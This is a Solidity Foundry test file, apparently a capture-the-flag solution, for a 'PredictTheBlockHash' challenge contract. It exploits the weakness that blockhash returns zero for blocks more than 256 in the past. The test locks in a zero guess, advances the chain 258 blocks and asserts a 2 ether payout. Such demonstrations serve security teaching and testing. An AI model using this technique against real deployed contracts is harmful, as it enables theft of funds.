
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge challenge;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        assume(blockNumber > 0);
        assume(blockNumber <= type(uint256).max - 258);
        
        // --- 2. State Configuration ---
        
        vm.deal(address(this), 1 ether);
        
        vm.roll(blockNumber);
        
        // --- 3. Replication & Assertion ---
        
        challenge.lockInGuess{value: 1 ether}(bytes32(0));
        uint256 guessedBlock = blockNumber + 1;
        vm.roll(blockNumber + 258);
        
        bytes32 expected = bytes32(0);
                
        uint256 balanceBefore = address(this).balance;
        challenge.settle();
        
        assertEq(address(this).balance, balanceBefore + 2 ether);
    }
}
